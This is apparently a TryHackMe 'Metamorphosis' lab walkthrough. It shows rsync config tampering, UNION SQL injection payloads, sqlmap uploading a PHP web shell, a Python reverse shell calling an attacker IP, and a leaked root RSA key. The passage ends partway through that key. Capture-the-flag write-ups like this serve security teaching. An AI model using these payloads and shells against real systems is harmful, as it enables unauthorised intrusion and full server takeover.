# TryHackMe-Metamorphosis

**Scope:**

- Remote Synchronization (rsync)
- SQL Injection
- Remote Code Execution

**Keywords:**

- Directory Scan & Endpoint Control
- Server Message Block (SMB) Enumeration
- Remote Synchronization (rsync) Enumeration & Forbidden Bypass
- SQL Injection
- Remote Code Execution

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`
- `wfuzz -u http://metamorphosis.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -c -t 50 -L`
- `gobuster dir -u http://metamorphosis.thm/admin/ -w /usr/share/wordlists/dirb/common.txt -b 403,404,500,501,502,503 --random-agent -e -x php,html,txt -t 50`
- `nmap -sV -Pn -T4 -A -O -oN nmap_smb.txt -p 139,445 --script="smb-*" $target_ip`
- `enum4linux-ng -A $target_ip`
- `nmap -sV -T4 -A -O -oN nmap_rsync.txt -Pn -p 873 --script="rsync-*" $target_ip`
- `nc -nv $target_ip 873`
- `rsync -av --list-only rsync://$target_ip/Conf`
- `msfconsole -qx 'use auxiliary/scanner/rsync/modules_list'`
- `rsync -av rsync://$target_ip/Conf metarsync`
- `rsync -av metarsync/webapp.ini rsync://$target_ip/Conf/webapp.ini`
- `sqlmap --random-agent -r sqlmapreq.txt --level 5 --risk 3 --dump --batch -D 'db' -p 'username' --os-shell`
- `sqlmap -r sqlmapreq.txt --file-dest=/var/www/html/hexpayload.php --file-write=./hexpayload.php --batch`
- `curl -sG 'http://metamorphosis.thm/phprce.php' --data-urlencode "cmd=id" | sed 's/\x00/ /g'`
- `curl -sG 'http://metamorphosis.thm/phprce.php' --data-urlencode "cmd=$(cat reversepayload)"`
- `ssh -i rootid root@metamorphosis.thm -p 22`

**System Commands:**

- `getcap -r / 2>/dev/null`
- `ss -tulwn`
- `cat /etc/passwd | grep '/bin/bash'`
- `SHELL=/bin/bash script -q /dev/null`
- `export TERM=xterm`
- `tom" UNION SELECT 1,database(),3 -- -`
- `tom" UNION SELECT 1,@@version,user() -- -`
- `tom" UNION SELECT 1,2,3 -- -`

### Laboratory Environment

[Metamorphosis](https://tryhackme.com/r/room/metamorphosis)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`

```jsx
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://metamorphosis.thm`

```jsx
HTTP/1.1 200 OK
Date: Fri, 13 Dec 2024 08:40:16 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

[REDACTED] - MORE
```

> **Directory Scan & Endpoint Control Phase**
> 

`wfuzz -u http://metamorphosis.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -c -t 50 -L`

```jsx
000000286:   200        0 L      15 W       132 Ch      "admin"
000002021:   200        367 L    953 W      10818 Ch    "index.php"
```

`gobuster dir -u http://metamorphosis.thm/admin/ -w /usr/share/wordlists/dirb/common.txt -b 403,404,500,501,502,503 --random-agent -e -x php,html,txt -t 50`

```jsx
http://metamorphosis.thm/admin/config.php           (Status: 200) [Size: 0]
http://metamorphosis.thm/admin/index.php            (Status: 200) [Size: 132]
```

`curl -iLX GET http://metamorphosis.thm/admin/config.php`

```jsx
HTTP/1.1 200 OK
Date: Fri, 13 Dec 2024 08:47:55 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```

`curl -iLX GET http://metamorphosis.thm/admin/`

```jsx
HTTP/1.1 200 OK
Date: Fri, 13 Dec 2024 08:48:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 132
Content-Type: text/html; charset=UTF-8

<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html> 
```

`curl -iLX GET http://metamorphosis.thm/admin/index.php`

```jsx
HTTP/1.1 200 OK
Date: Fri, 13 Dec 2024 08:48:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 132
Content-Type: text/html; charset=UTF-8

<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html> 
```

> **Server Message Block (SMB) Enumeration Phase**
> 

`nmap -sV -Pn -T4 -A -O -oN nmap_smb.txt -p 139,445 --script="smb-*" $target_ip`

```jsx
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: INCOGNITO

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-print-text: false
|_smb-vuln-ms10-054: false
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.227.36\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (incognito server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.227.36\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-domains: 
|   INCOGNITO
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
| smb-mbenum: 
|   DFS Root
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Master Browser
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Print server
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Server
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Server service
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Unix server
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Windows NT/2000/XP/2003 server
|     INCOGNITO  0.0  incognito server (Samba, Ubuntu)
|   Workstation
|_    INCOGNITO  0.0  incognito server (Samba, Ubuntu)
| smb-brute: 
|_  No accounts found
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2024-12-13T08:52:26+00:00
|_smb-vuln-ms10-061: false
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-flood: ERROR: Script execution failed (use -d to debug)
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
```

`enum4linux-ng -A $target_ip`

```jsx
[REDACTED] - MORE

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.10.227.36    |
 ===========================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- INCOGNITO       <00> -         B <ACTIVE>  Workstation Service                                                                           
- INCOGNITO       <03> -         B <ACTIVE>  Messenger Service                                                                             
- INCOGNITO       <20> -         B <ACTIVE>  File Server Service                                                                           
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser                                                                                
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name                                                                         
- WORKGROUP       <1d> -         B <ACTIVE>  Master Browser                                                                                
- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections                                                                     
- MAC Address = 00-00-00-00-00-00                                                                                                          

 =========================================
|    SMB Dialect Check on 10.10.227.36    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                        
  SMB 1.0: true                                                                                                                            
  SMB 2.02: true                                                                                                                           
  SMB 2.1: true                                                                                                                            
  SMB 3.0: true                                                                                                                            
  SMB 3.1.1: true                                                                                                                          
Preferred dialect: SMB 3.0                                                                                                                 
SMB1 only: false                                                                                                                           
SMB signing required: false                                                                                                                

 ===========================================================
|    Domain Information via SMB session for 10.10.227.36    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: INCOGNITO                                                                                                           
NetBIOS domain name: ''                                                                                                                    
DNS domain: ''                                                                                                                             
FQDN: incognito                                                                                                                            
Derived membership: workgroup member                                                                                                       
Derived domain: unknown                                                                                                                    

 =========================================
|    RPC Session Check on 10.10.227.36    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'blztlcdr', password ''
[H] Rerunning enumeration with user 'blztlcdr' might give more results

[REDACTED] - MORE
```

`nano /etc/hosts`

```jsx
10.10.227.36    metamorphosis.thm INCOGNITO
```

> **Remote Synchronization (rsync) Enumeration & Forbidden Bypass Phase**
> 

`nmap -sV -T4 -A -O -oN nmap_rsync.txt -Pn -p 873 --script="rsync-*" $target_ip`

```jsx
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  Conf                All Confs
```

`nc -nv $target_ip 873`

```jsx
@RSYNCD: 31.0
@RSYNCD: 31.0

Conf            All Confs
@RSYNCD: EXIT
```

`rsync -av --list-only rsync://$target_ip/Conf`

```jsx
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 16:03:08 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini

sent 20 bytes  received 379 bytes  114.00 bytes/sec
total size is 193,430  speedup is 484.79
```

`msfconsole -qx 'use auxiliary/scanner/rsync/modules_list'`

```jsx
msf6 auxiliary(scanner/rsync/modules_list) > set RHOSTS 10.10.227.36
RHOSTS => 10.10.227.36
msf6 auxiliary(scanner/rsync/modules_list) > run

[+] 10.10.227.36:873      - 1 rsync modules found: Conf
[*] 10.10.227.36:873      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`mkdir metarsync`

`rsync -av rsync://$target_ip/Conf metarsync`

```jsx
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini
```

`ls -lsa metarsync`

```jsx
 4 drwxrwxrwx 2 root   root     4096 Apr 10  2021 .
 4 drwxr-xr-x 3 root   root     4096 Dec 13 04:16 ..
 8 -rw-r--r-- 1 nobody kali     4620 Apr  9  2021 access.conf
 4 -rw-r--r-- 1 nobody root     1341 Apr  9  2021 bluezone.ini
 4 -rw-r--r-- 1 nobody kali     2969 Apr  9  2021 debconf.conf
 4 -rw-r--r-- 1 nobody kali      332 Apr  9  2021 ldap.conf
96 -rw-r--r-- 1 nobody kali    94404 Apr  9  2021 lvm.conf
12 -rw-r--r-- 1 nobody nogroup  9005 Apr  9  2021 mysql.ini
72 -rw-r--r-- 1 nobody nogroup 70207 Apr  9  2021 php.ini
 4 -rw-r--r-- 1 nobody kali      320 Apr  9  2021 ports.conf
 4 -rw-r--r-- 1 nobody kali      589 Apr  9  2021 resolv.conf
 4 -rw-r--r-- 1 nobody kali       29 Apr  9  2021 screen-cleanup.conf
12 -rw-r--r-- 1 nobody kali     9542 Apr  9  2021 smb.conf
 4 -rw-rw-r-- 1 nobody nogroup    72 Apr 10  2021 webapp.ini
```

`cat metarsync/webapp.ini`

```jsx
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

`nano metarsync/webapp.ini`

```jsx
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

`rsync -av metarsync/webapp.ini rsync://$target_ip/Conf/webapp.ini`

```jsx
sending incremental file list
webapp.ini

sent 186 bytes  received 41 bytes  64.86 bytes/sec
total size is 71  speedup is 0.31
```

`curl -iLX GET -D response.txt http://metamorphosis.thm/admin/index.php`

```jsx
HTTP/1.1 200 OK
Date: Fri, 13 Dec 2024 09:19:55 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 261
Content-Type: text/html; charset=UTF-8

<html><head><div style='text-align:center'>
<h1 style='text-align:center'>Get Info of users</h1>
<form action='config.php' method='POST'>Username: <input type='text' name='username'/>
<input type='submit'/></form><br><h4>TODO: Add more features</div> <head></html> 
```

![image.png](image.png)

![image.png](image%201.png)

> **SQL Injection & Reverse Shell Phase**
> 

![image.png](image%202.png)

**PAYLOAD:**

```jsx
tom" UNION SELECT 1,2,3 -- -
```

![image.png](image%203.png)

![image.png](image%204.png)

**PAYLOAD:**

```jsx
tom" UNION SELECT 1,@@version,user() -- -
```

![image.png](image%205.png)

![image.png](image%206.png)

**PAYLOAD:**

```jsx
tom" UNION SELECT 1,database(),3 -- -
```

![image.png](image%207.png)

![image.png](image%208.png)

`sqlmap --random-agent -r sqlmapreq.txt --level 5 --risk 3 --dump --batch -D 'db' -p 'username' --os-shell`

```jsx
Database: db
Table: users
[1 entry]
+----+-------+----------+
| id | uname | password |
+----+-------+----------+
| 1  | tom   | thecat   |
+----+-------+----------+

[04:45:18] [INFO] table 'db.users' dumped to CSV file '/root/.local/share/sqlmap/output/metamorphosis.thm/dump/db/users.csv'
[04:45:18] [INFO] going to use a web backdoor for command prompt
[04:45:18] [INFO] fingerprinting the back-end DBMS operating system
[04:45:18] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] Y
[04:45:19] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1
[04:45:19] [WARNING] unable to automatically parse any web server path
[04:45:19] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[04:45:21] [WARNING] unable to upload the file stager on '/var/www/'
[04:45:21] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[04:45:22] [WARNING] expect junk characters inside the file as a leftover from UNION query
[04:45:22] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[04:45:23] [INFO] trying to upload the file stager on '/var/www/admin/' via LIMIT 'LINES TERMINATED BY' method
[04:45:26] [WARNING] unable to upload the file stager on '/var/www/admin/'
[04:45:26] [INFO] trying to upload the file stager on '/var/www/admin/' via UNION method
[04:45:27] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[04:45:29] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[04:45:31] [WARNING] unable to upload the file stager on '/var/www/html/'
[04:45:31] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[04:45:32] [INFO] the remote file '/var/www/html/tmpujsof.php' is larger (707 B) than the local file '/tmp/sqlmap4dd893pn38276/tmpe324sm0t' (705B)
[04:45:34] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://metamorphosis.thm:80/tmpujsof.php
[04:45:35] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://metamorphosis.thm:80/tmpbfcos.php
[04:45:35] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> 
```

> **Remote Code Execution & Reverse Shell Phase**
> 

`nano phpreverse.php`

```jsx
<?php system($_GET["cmd"]); ?>
```

`cat phpreverse.php | xxd -p`

```jsx
3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e
```

`nano hexpayload.php`

```jsx
0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e
```

`sqlmap -r sqlmapreq.txt --file-dest=/var/www/html/hexpayload.php --file-write=./hexpayload.php --batch`

```jsx
[04:55:43] [INFO] fingerprinting the back-end DBMS operating system
[04:55:43] [INFO] the back-end DBMS operating system is Linux
[04:55:44] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file 'hexpayload.php' has been successfully written on the back-end DBMS file system ('/var/www/html/hexpayload.php')? [Y/n] Y
[04:55:45] [INFO] the remote file '/var/www/html/hexpayload.php' is larger (65 B) than the local file 'hexpayload.php' (63B)
[04:55:45] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metamorphosis.thm'

[*] ending @ 04:55:45 /2024-12-13/

```

`sqlmap -r sqlmapreq.txt --file-dest=/var/www/html/phprce.php --file-write=./phpreverse.php --batch`

```jsx
[04:56:32] [INFO] fingerprinting the back-end DBMS operating system
[04:56:32] [INFO] the back-end DBMS operating system is Linux
[04:56:33] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file 'phpreverse.php' has been successfully written on the back-end DBMS file system ('/var/www/html/phpreverse.php')? [Y/n] Y
[04:56:33] [INFO] the remote file '/var/www/html/phpreverse.php' is larger (33 B) than the local file 'phpreverse.php' (31B)
```

`curl -sG 'http://metamorphosis.thm/phprce.php' --data-urlencode "cmd=id" | sed 's/\x00/ /g'`

```jsx
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`nano reversepayload`

```jsx
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.2.37.37",10111));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

`nc -nlvp 10111`

```jsx
listening on [any] 10111 ...
```

`curl -sG 'http://metamorphosis.thm/phprce.php' --data-urlencode "cmd=$(cat reversepayload)"`

```jsx
listening on [any] 10111 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.227.36] 48032

www-data@incognito:/var/www/html$ whoami
www-data
www-data@incognito:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@incognito:/var/www/html$ pwd
/var/www/html
www-data@incognito:/var/www/html$ SHELL=/bin/bash script -q /dev/null
www-data@incognito:/var/www/html$ export TERM=xterm

www-data@incognito:/var/www/html$ uname -a
Linux incognito 4.15.0-144-generic #148-Ubuntu SMP Sat May 8 02:33:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
www-data@incognito:/var/www/html$ dpkg --version
Debian 'dpkg' package management program version 1.19.0.5 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.

www-data@incognito:/var/www/html$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1001::/home/tom:/bin/bash

www-data@incognito:/var/www/html$ ls -lsa /home
total 12
4 drwxr-xr-x  3 root root 4096 Apr 10  2021 .
4 drwxr-xr-x 24 root root 4096 Jun  9  2021 ..
4 drwxr-xr-x  5 tom  tom  4096 Jun  9  2021 tom

www-data@incognito:/var/www/html$ 
```

> **Internal System Investigation Phase**
> 

```jsx
www-data@incognito:/var/www/html$ ss -tulwn
Netid State   Recv-Q  Send-Q          Local Address:Port     Peer Address:Port  
icmp6 UNCONN  0       0                      *%eth0:58                  *:*     
udp   UNCONN  0       0           10.10.227.36%eth0:68            0.0.0.0:*     
udp   UNCONN  0       0               10.10.255.255:137           0.0.0.0:*     
udp   UNCONN  0       0                10.10.227.36:137           0.0.0.0:*     
udp   UNCONN  0       0                     0.0.0.0:137           0.0.0.0:*     
udp   UNCONN  0       0               10.10.255.255:138           0.0.0.0:*     
udp   UNCONN  0       0                10.10.227.36:138           0.0.0.0:*     
udp   UNCONN  0       0                     0.0.0.0:138           0.0.0.0:*     
udp   UNCONN  0       0               127.0.0.53%lo:53            0.0.0.0:*     
tcp   LISTEN  0       128                 127.0.0.1:1027          0.0.0.0:*     
tcp   LISTEN  0       5                     0.0.0.0:873           0.0.0.0:*     
tcp   LISTEN  0       80                  127.0.0.1:3306          0.0.0.0:*     
tcp   LISTEN  0       50                    0.0.0.0:139           0.0.0.0:*     
tcp   LISTEN  0       128             127.0.0.53%lo:53            0.0.0.0:*     
tcp   LISTEN  0       128                   0.0.0.0:22            0.0.0.0:*     
tcp   LISTEN  0       50                    0.0.0.0:445           0.0.0.0:*     
tcp   LISTEN  0       5                        [::]:873              [::]:*     
tcp   LISTEN  0       50                       [::]:139              [::]:*     
tcp   LISTEN  0       128                         *:80                  *:*     
tcp   LISTEN  0       128                      [::]:22               [::]:*     
tcp   LISTEN  0       50                       [::]:445              [::]:*     

www-data@incognito:/var/www/html$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 incognito

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

www-data@incognito:/var/www/html$ curl -iLX GET 127.0.0.1:1027

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 25
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Fri, 13 Dec 2024 10:34:04 GMT

Only Talking to Root User

www-data@incognito:/var/www/html$ getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep

www-data@incognito:/var/www/html$ 

```

> **Privilege Escalation with Internal Logic**
> 

`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`

```jsx
pspy64                             100%[===============================================================>]   2.96M  4.50MB/s    in 0.7s    

2024-12-13 05:41:13 (4.50 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

**For source:**

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

`python3 -m http.server 8000`

```jsx
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```jsx
www-data@incognito:/var/www/html$ wget http://10.2.37.37:8000/pspy64

pspy64              100%[===================>]   2.96M   809KB/s    in 5.4s    

2024-12-13 10:39:36 (566 KB/s) - 'pspy64' saved [3104768/3104768]

www-data@incognito:/var/www/html$ chmod +x pspy64
www-data@incognito:/var/www/html$ ./pspy64

[REDACTED] - MORE

2024/12/13 10:42:01 CMD: UID=0     PID=2837   | curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12

[REDACTED] - MORE

www-data@incognito:/var/www/html$ curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----

www-data@incognito:/var/www/html$
```

`nano rootid`

```jsx
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
